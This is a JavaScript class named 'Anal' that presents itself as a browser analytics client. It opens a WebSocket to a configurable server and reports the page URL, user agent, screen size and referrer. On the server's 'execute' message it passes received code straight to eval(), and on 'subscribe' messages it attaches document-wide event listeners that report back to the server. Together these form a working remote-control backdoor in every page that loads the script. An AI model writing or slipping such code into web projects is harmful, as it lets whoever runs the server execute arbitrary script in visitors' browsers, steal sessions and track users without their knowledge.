class Anal {
  constructor(url) {
    this.url = url;
    this.listeners = {};
    this.socket = null;
    this.connect();
  }
  connect() {
    if (this.socket && (this.socket.readyState === WebSocket.OPEN || this.socket.readyState === WebSocket.CONNECTING)) {
      console.warn(`socket already connected`);
      return;
    }
    this.socket = new WebSocket(this.url);
    this.socket.onopen = this._onOpen.bind(this);
    this.socket.onmessage = this._onMessage.bind(this);
    this.socket.onclose = this._onClose.bind(this);
    this.socket.onerror = this._onError.bind(this);
  }
  disconnect() {
    if (this.socket && (this.socket.readyState === WebSocket.OPEN || this.socket.readyState === WebSocket.CONNECTING)) {
      this.socket.close();
      for (const eventType in this.listeners) {
        if (this.listeners.hasOwnProperty(eventType)) {
          document.removeEventListener(eventType, this.listeners[eventType]);
          delete this.listeners[eventType];
        }
      }
    } else {
      console.warn(`not connected`);
    }
  }
  _onOpen() {
    console.info('anal connected');
    this.socket.send(JSON.stringify({
      type: 'init',
      payload: {
        url: window.location.href,
        agent: navigator.userAgent,
        screen: {
          width: window.screen.width,
          height: window.screen.height
        },
        referrer: document.referrer
      }
    }));
  }
  _onMessage(event) {
    const msg = JSON.parse(event.data);
    switch (msg.type) {
      case "execute":
        this._handleExecute(msg.payload);
        break;
      case "subscribe":
        this._handleSubscribe(msg.payload);
        break;
      case "unsubscribe":
        this._handleUnsubscribe(msg.payload);
        break;
      default:
        console.warn(`Unknown message type ${msg.type}`);
    }
  }
  _onClose() {
    console.info('anal disconnected');
  }
  _onError(error) {
    console.error(error);
  }
  _handleExecute(code) {
    try {
      eval(code);
    } catch (e) {
      console.error("error executing payload:", e);
    }
  }
  _handleSubscribe(eventType) {
    if (this.listeners[eventType]) {
      console.log(`Already subscribed to event=${eventType}`);
      return;
    }
    console.log(`subscribing to event=${eventType}`);
    const handler = e => {
      const eventMessage = {
        type: 'event',
        payload: {
          event: eventType,
          //TODO: event related data
          // x: e.clientX,
          // y: e.clientY,
          // target: e.target.tagName
        },
      };
      this.socket.send(JSON.stringify(eventMessage));
    };
    this.listeners[eventType] = handler;
    document.addEventListener(eventType, handler);
  }
  _handleUnsubscribe(eventType) {
    const listener = this.listeners[eventType];
    if (listener) {
      console.log(`Unsubscribing from event=${eventType}`);
      document.removeEventListener(eventType, listener);
      delete this.listeners[eventType];
    } else {
      console.log(`Not currently subscribed to event=${eventType}`);
    }
  }
}
window.Anal = Anal;
